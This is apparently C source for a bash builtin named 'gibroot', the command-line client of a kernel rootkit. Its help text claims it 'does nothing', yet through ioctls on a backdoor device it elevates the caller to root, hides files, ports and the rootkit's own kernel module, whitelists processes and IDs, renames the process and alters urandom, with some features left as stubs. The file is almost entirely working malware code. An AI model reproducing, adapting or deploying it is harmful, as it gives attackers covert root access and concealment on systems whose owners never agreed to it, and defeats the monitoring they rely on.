$PRODUCES gibroot.c
$BUILTIN gibroot
$FUNCTION gibroot_builtin
$SHORT_DOC gibroot [cmd] [arg ...]
does nothing
:-)
$END

#include <config.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <libgen.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <inttypes.h>
#include <arpa/inet.h>
#include "../bashtypes.h"
#include "../bashintl.h"
#include "../shell.h"
#include "common.h"
#include "../../bdoor_common.h"

#define MIN(X, Y) (((X) < (Y)) ? (X) : (Y))
#define ARRAY_LENGTH(array) (sizeof((array))/sizeof((array)[0]))

/*
static void hexdump(char *desc, void *addr, int len)
{
	int i;
	unsigned char buff[17];       // stores the ASCII data
	unsigned char *pc = addr;     // cast to make the code cleaner.

	// Output description if given.

	if (desc != NULL)
		printf("%s:\n", desc);

	// Process every byte in the data.

	for (i = 0; i < len; i++) {
		// Multiple of 16 means new line (with line offset).

		if ((i % 16) == 0) {
			// Just don't print ASCII for the zeroth line.

			if (i != 0)
				printf("  %s\n", buff);

			// Output the offset.

			printf("  %04x ", i);
		}

		// Now the hex code for the specific character.

		printf(" %02x", pc[i]);

		// And store a printable ASCII character for later.

		if ((pc[i] < 0x20) || (pc[i] > 0x7e))
			buff[i % 16] = '.';
		else
			buff[i % 16] = pc[i];
		buff[(i % 16) + 1] = '\0';
	}

	// Pad out last line if not exactly 16 characters.

	while ((i % 16) != 0) {
		printf("   ");
		i++;
	}

	// And print the final ASCII bit.

	printf("  %s\n", buff);
}
*/

static int backdoor_fd;

static int open_device(void)
{
	backdoor_fd = open(BDOOR_DEV_PATH,O_RDONLY);
	printf("file descriptor:%d\n",backdoor_fd);
	if (backdoor_fd == -1)
		return -1;
	return 0;
}

static void close_device(void)
{
	close(backdoor_fd);
}

static int make_root(list) WORD_LIST *list;
{
	int res;
	int ret;
	printf("uid before ioctl:%lu\n",getuid());
	res = ioctl(backdoor_fd,ROOT_IOCTL,NULL);
	printf("uid after ioctl:%lu\n",getuid());
	if (res == 0) {
		printf("successfully rooted user\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR ROOTING USER");
		ret = EXECUTION_FAILURE;
	}
	return ret;
}

static int make_unroot(list) WORD_LIST *list;
{
	int res;
	int ret;
	printf("uid before ioctl:%lu\n",getuid());
	res = ioctl(backdoor_fd,UNROOT_IOCTL,NULL);
	printf("uid after ioctl:%lu\n",getuid());
	if (res == 0) {
		printf("successfully restored user creds\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR RESTORING USER CREDS");
		ret = EXECUTION_FAILURE;
	}
	return ret;
}

static int toggle_urandom(list) WORD_LIST *list;
{
	int res;
	int ret;
	res = ioctl(backdoor_fd,URAND_IOCTL,NULL);
	if (res == 0) {
		printf("successfully toggled urandom behaviour\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR TOGGLING URANDOM BEHAVIOUR");
		ret = EXECUTION_FAILURE;
	}
	return 0;
}

void init_request(struct hide_request *request)
{
        request->count = 0;
        request->idents = NULL;
}

void add_request(struct hide_request *request,
                int len,char *name,
                dev_t dev, unsigned long par_ino)
{
	struct dentry_identifier new_ident = {
                .name_len = len,
                .device = dev,
                .parent_ino = par_ino,
        };
	strncpy(new_ident.name,name,256);

	request->count++;
        request->idents = realloc(request->idents, //done since reallocarray doesn't seem to be available
				request->count * sizeof(struct dentry_identifier));

	memcpy(&request->idents[request->count - 1],&new_ident,
		sizeof(struct dentry_identifier));
}

void free_request(struct hide_request *request)
{
        free(request->idents);
}

static int get_parent_stuff(char *path,dev_t *parent_dev,
		ino_t *parent_ino,DIR **parent_dir)
{
	int ret = 0;
	char *dname;
	struct stat parent_stat;
	char *path_cpy = calloc((strlen(path) + 1),sizeof(char));
	strcpy(path_cpy,path);//THIS ISN'T GREAT
	dname = dirname(path_cpy);
	if (stat(dname,&parent_stat)) {
		perror("ERROR GETTING PARENT DIRECTORY");
		ret = -1;
		goto out;
	}
	*parent_dev = parent_stat.st_dev;
	*parent_ino = parent_stat.st_ino;
	*parent_dir = opendir(dname);
out:
	free(path_cpy);
	return ret;
}

static void get_basename_stuff(char *path,char **bname)
{
	char *path_cpy = calloc((strlen(path) + 1), sizeof(char));
	char *base_ptr;
	strcpy(path_cpy,path);//THIS ISN'T GREAT
	base_ptr = basename(path_cpy);
	*bname = calloc((strlen(base_ptr) + 1), sizeof(char));//MAKE SURE THAT THIS WILL BE AT MOST 256 BYTES
	strncpy(*bname,base_ptr,MIN(strlen(base_ptr),255));
	free(path_cpy);
}

static int construct_request(char *path, struct hide_request *req)
{
	DIR *parent_dir;
	dev_t parent_dev;
	ino_t parent_ino;
	char *bname;
	int ret = 0;
	ret = get_parent_stuff(path,
			&parent_dev,
			&parent_ino,
			&parent_dir);
	if (ret)
		goto out;

	get_basename_stuff(path,&bname);
	add_request(req,
		strlen(bname),
		bname,
		parent_dev,parent_ino);
	free(bname);
out:
	return ret;
}

static int hide_item(list) WORD_LIST *list;
{
	int res;
	int ret;
	struct hide_request req;
	char *word;

	init_request(&req);

	while (list != NULL) {
		word = list->word->word;
		if(construct_request(word,&req))
			goto err_out;
		list = list->next;
	}
	res = ioctl(backdoor_fd,HIDE_IOCTL,&req);
	free_request(&req);

	if (res == 0) {
		printf("successfully hid items\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR HIDING ITEMS");
		ret = EXECUTION_FAILURE;
	}
	return 0;
err_out:
	if (req.count)
		free_request(&req);
	return EXECUTION_FAILURE;
}

static int show_item(list) WORD_LIST *list;
{
	int res;
	int ret;
	struct hide_request req;
	char *word;

	init_request(&req);

	while (list != NULL) {
		word = list->word->word;
		if(construct_request(word,&req))
			goto err_out;
		list = list->next;
	}
	res = ioctl(backdoor_fd,SHOW_IOCTL,&req);
	free_request(&req);

	if (res == 0) {
		printf("successfully unhid items\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR UNHIDING ITEMS");
		ret = EXECUTION_FAILURE;
	}
	return 0;
err_out:
	if (req.count)
		free_request(&req);
	return EXECUTION_FAILURE;
}

static int list_hidden_items(list) WORD_LIST *list;
{
	printf("not yet implemented\n");
	return 0;
}

static int inject_pid(list) WORD_LIST *list;
{
	printf("not yet implemented\n");
	return 0;
}

static int replace_libs(list) WORD_LIST *list;
{
	printf("not yet implemented\n");
	return 0;
}

static int hide_mod(list) WORD_LIST *list;
{
	int ret;
	int res;
	res = ioctl(backdoor_fd,HIDE_MOD_IOCTL,NULL);
	if (res == 0) {
		printf("successfully hid kernel module\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR HIDING MODULE");
		ret = EXECUTION_FAILURE;
	}
	return ret;
}

static int show_mod(list) WORD_LIST *list;
{
	int ret;
	int res;
	res = ioctl(backdoor_fd,SHOW_MOD_IOCTL,NULL);
	if (res == 0) {
		printf("successfully unhid kernel module\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR UNHIDING MODULE");
		ret = EXECUTION_FAILURE;
	}
	return ret;
}


void init_white_request(struct white_request *request)
{
        request->count = 0;
        request->entries = NULL;
}

int add_white_request(enum white_type wtype, char *arg,
		struct white_request *request)
{
	int ret = 0;
	struct whitelist_entry new_entry = {
		.wtype = wtype,
	};
	switch (wtype) {
	case PROCNAME:
		explicit_bzero(new_entry.name,16);
		strncpy(new_entry.name,arg,16);
		break;
	case PID:
	case UID:
	case GID:
		new_entry.id = strtoumax(arg,NULL,10);
		if (errno != 0) {
			perror("ERROR ADDING ID ENTRY");
			ret = errno;
			goto out;
		}
		break;
	//SOME COMPILERS WON'T LIKE THIS UNTILL IT DOES SOMETHING
	//default:
		//idfk do some error stuff maybe
	}

	request->count++;

	request->entries = realloc(request->entries, //done since reallocarray doesn't seem to be available
				request->count * sizeof(struct whitelist_entry));

	memcpy(&request->entries[request->count - 1],&new_entry,
		sizeof(struct whitelist_entry));
out:
	return ret;
}

void free_white_request(struct white_request *request)
{
        free(request->entries);
}

enum white_type identify_white_type(char *word)
{
	int cur;
	for (cur = 0; cur < ARRAY_LENGTH(white_type_names); cur++) {
		if (!strncmp(word,white_type_names[cur],
				strlen(white_type_names[cur])))
			return cur;
	}
	return -1;
}


static int whitelist_add(list) WORD_LIST *list;
{
	int res;
	int ret;
	struct white_request req;
	enum white_type cur_type;
	char *word;

	init_white_request(&req);

	if (list == NULL) {
		printf("ERROR: MISSING TYPE FOR WHITELIST ENTRY\n");
		goto err_out;
	}
	while (list != NULL) {
		word = list->word->word;
		cur_type = identify_white_type(word);
		if (cur_type == INVALID) {
			printf("ERROR: INVALID TYPE FOR WHITELIST ENTRY\n");
			goto err_out;
		}
		list = list->next;
		if (list == NULL) {
			printf("ERROR: MISSING NAME/ID FOR ENTRY\n");
			goto err_out;
		}
		word = list->word->word;
		if(add_white_request(cur_type,word,&req))
			goto err_out;
		list = list->next;
	}

	res = ioctl(backdoor_fd,WHIT_ADD_IOCTL,&req);
	free_white_request(&req);

	if (res == 0) {
		printf("successfully added items\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR adding ITEMS");
		ret = EXECUTION_FAILURE;
	}
	return ret;
err_out:
	if (req.count)
		free_white_request(&req);
	return EXECUTION_FAILURE;
}


static int whitelist_remove(list) WORD_LIST *list;
{
	int res;
	int ret;
	struct white_request req;
	enum white_type cur_type;
	char *word;

	init_white_request(&req);

	if (list == NULL) {
		printf("ERROR: MISSING TYPE FOR WHITELIST ENTRY\n");
		goto err_out;
	}
	while (list != NULL) {
		word = list->word->word;
		cur_type = identify_white_type(word);
		if (cur_type == INVALID) {
			printf("ERROR: INVALID TYPE FOR WHITELIST ENTRY\n");
			goto err_out;
		}
		list = list->next;
		if (list == NULL) {
			printf("ERROR: MISSING NAME/ID FOR ENTRY\n");
			goto err_out;
		}
		word = list->word->word;
		if(add_white_request(cur_type,word,&req))
			goto err_out;
		list = list->next;
	}
	res = ioctl(backdoor_fd,WHIT_REM_IOCTL,&req);
	free_white_request(&req);

	if (res == 0) {
		printf("successfully removed items\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR REMOVING ITEMS");
		ret = EXECUTION_FAILURE;
	}
	return ret;
err_out:
	if (req.count)
		free_white_request(&req);
	return EXECUTION_FAILURE;
}

static int list_whitelist_items(list) WORD_LIST *list;
{
	printf("not yet implemented\n");
	return 0;
}

static int change_my_name(list) WORD_LIST *list;
{
	int res;
	int ret;
	struct comm_name newname;
	char *word = list->word->word;

	if (word == NULL) {
		printf("ERROR: NO NAME GIVEN!\n");
		goto err_out;
	}

	if (strlen(word) > 16) {
		printf("ERROR: NEW NAME TOO LONG!\n");
		goto err_out;
	}

	memset(&newname,0,sizeof(struct comm_name));

	memcpy(newname.name,word,MIN(strlen(word),16));

	res = ioctl(backdoor_fd,CHANGE_COMM_IOCTL,&newname);

	if (res == 0) {
		printf("successfully changed name\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR CHANGING NAME");
		ret = EXECUTION_FAILURE;
	}

	return ret;

err_out:
	return EXECUTION_FAILURE;
}


void init_sock_request(struct sock_request *request)
{
        request->count = 0;
        request->socks = NULL;
}

int add_sock_request(enum rkit_sock_type type, enum __socket_type stype,
		__u16 portno,struct sock_request *request)
{
	int ret = 0;
	struct sock_id new_entry = {
		.type = type,
		.stype = stype,
		.port_no = htons(portno),
	};

	request->count++;

	request->socks = realloc(request->socks, //done since reallocarray doesn't seem to be available
				request->count * sizeof(struct sock_id));

	memcpy(&request->socks[request->count - 1],&new_entry,
		sizeof(struct sock_id));
out:
	return ret;
}

void free_sock_request(struct sock_request *request)
{
        free(request->socks);
}

enum rkit_sock_type identify_sock_type(char *word)
{
	int cur;
	for (cur = 0; cur < ARRAY_LENGTH(rkit_sock_type_names); cur++) {
		if (!strncmp(word,rkit_sock_type_names[cur],
				strlen(rkit_sock_type_names[cur])))
			return cur;
	}
	return -1;
}

static int identify_stype(char *word)
{
	int cur_stype;
	for (cur_stype = 0; cur_stype <= SOCK_PACKET; cur_stype++) {
		if (!valid_sock_types[cur_stype])
                        continue;
		if(!strncmp(word,sock_type_names[cur_stype],
				strlen(sock_type_names[cur_stype])))
			return cur_stype;
	}
	return -1;
}

static int hide_ports(list) WORD_LIST *list;
{
	int res;
	int ret;
	struct sock_request req;
	unsigned long cur_port;
	enum rkit_sock_type cur_type;
	enum __socket_type cur_stype;
	char *word;
	char *endptr;

	init_sock_request(&req);

	if (list == NULL) {
		printf("ERROR: MISSING TYPE FOR ENTRY\n");
		goto err_out;
	}
	while (list != NULL) {
		word = list->word->word;
		cur_type = identify_sock_type(word);
		if (cur_type == INVALID) {
			printf("ERROR: INVALID TYPE FOR SOCKET BLACKLIST ENTRY\n");
			goto err_out;
		}
		printf("oyoyoy\n");
		list = list->next;
		if (list == NULL) {
			printf("ERROR: MISSING STYPE FOR ENTRY\n");
			goto err_out;
		}
		word = list->word->word;
		cur_stype = identify_stype(word);
		if (cur_stype == -1) {
			printf("ERROR: UNKNOWN STYPE %s\n",word);
			goto err_out;
		}
		list = list->next;
		if (list == NULL) {
			printf("ERROR: MISSING PORT NUMBER FOR ENTRY\n");
			goto err_out;
		}
		word = list->word->word;
		cur_port = strtoul(word,&endptr,10);
		if (*endptr) {
			printf("ERROR: NON NUMBER GIVEN\n");
			goto err_out;
		} else if (cur_port > 65535) {
			printf("ERROR: PORT NUMBER OF %ld TOO HIGH\n",cur_port);
			goto err_out;
		}
		if(add_sock_request(cur_type,cur_stype,(__u16)cur_port,&req))
			goto err_out;
		list = list->next;
	}

	res = ioctl(backdoor_fd,HIDE_PORT_IOCTL,&req);
	free_sock_request(&req);

	if (res == 0) {
		printf("successfully hid port(s)\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR HIDING PORTS");
		ret = EXECUTION_FAILURE;
	}
	return ret;
err_out:
	if (req.count)
		free_sock_request(&req);
	return EXECUTION_FAILURE;
}

static int show_ports(list) WORD_LIST *list;
{
	int res;
	int ret;
	struct sock_request req;
	unsigned long cur_port;
	enum rkit_sock_type cur_type;
	enum __socket_type cur_stype;
	char *word;
	char *endptr = NULL;

	init_sock_request(&req);

	if (list == NULL) {
		printf("ERROR: MISSING TYPE FOR ENTRY\n");
		goto err_out;
	}
	while (list != NULL) {
		word = list->word->word;
		cur_type = identify_sock_type(word);
		if (cur_type == INVALID) {
			printf("ERROR: INVALID TYPE FOR SOCKET BLACKLIST ENTRY\n");
			goto err_out;
		}
		list = list->next;
		if (list == NULL) {
			printf("ERROR: MISSING STYPE FOR ENTRY\n");
			goto err_out;
		}
		word = list->word->word;
		cur_stype = identify_stype(word);
		if (cur_stype == -1) {
			printf("ERROR: UNKNOWN STYPE %s\n",word);
			goto err_out;
		}
		list = list->next;
		if (list == NULL) {
			printf("ERROR: MISSING PORT NUMBER FOR ENTRY\n");
			goto err_out;
		}
		word = list->word->word;
		cur_port = strtoul(word,&endptr,10);
		if (*endptr) {
			printf("ERROR: NON NUMBER GIVEN\n");
			goto err_out;
		} else if (cur_port > 65535) {
			printf("ERROR: NUMBER TOO HIGH\n");
			goto err_out;
		}
		if(add_sock_request(cur_type,cur_stype,(__u16)cur_port,&req))
			goto err_out;
		list = list->next;
	}

	res = ioctl(backdoor_fd,SHOW_PORT_IOCTL,&req);
	free_sock_request(&req);

	if (res == 0) {
		printf("successfully unhid port(s)\n");
		ret = EXECUTION_SUCCESS;
	} else {
		perror("ERROR UNHIDING PORTS");
		ret = EXECUTION_FAILURE;
	}
	return ret;
err_out:
	if (req.count)
		free_sock_request(&req);
	return EXECUTION_FAILURE;
}

static const char *gibroot_cmd_names[] = {
	"root",
	"unroot",
	"urand",
	"hide",
	"show",
	"list",
	"inject",
	"replace",
	"hmod",
	"smod",
	"wadd",
	"wrem",
	"wlist",
	"newname",
	"hport",
	"sport",
};

int (*gibroot_cmd[])(WORD_LIST*) = {
	make_root,
	make_unroot,
	toggle_urandom,
	hide_item,
	show_item,
	list_hidden_items,
	inject_pid,
	replace_libs,
	hide_mod,
	show_mod,
	whitelist_add,
	whitelist_remove,
	list_whitelist_items,
	change_my_name,
	hide_ports,
	show_ports,
};


static int get_first_arg(list) WORD_LIST *list;
{
	char *word = list->word->word;
	int cur;
	for (cur = 0; cur < ARRAY_LENGTH(gibroot_cmd); cur++) {
		if (!strncmp(word,gibroot_cmd_names[cur],
				strlen(gibroot_cmd_names[cur])))
			return gibroot_cmd[cur](list->next);
	}
	printf("ERROR: invalid command\n");
	return EXECUTION_FAILURE;
}

int gibroot_builtin(list) WORD_LIST *list;
{
	int ret = 0;

	if (open_device() == -1) {
		printf("ERROR: backend device not registered\n");
		ret = EXECUTION_FAILURE;
		goto out;
	}
	if (list == 0) {
		printf("ERROR: need at least one argument\n");
		ret = EXECUTION_FAILURE;
	} else {
		ret = get_first_arg(list);
	}
	close_device();
out:
	return ret;
}
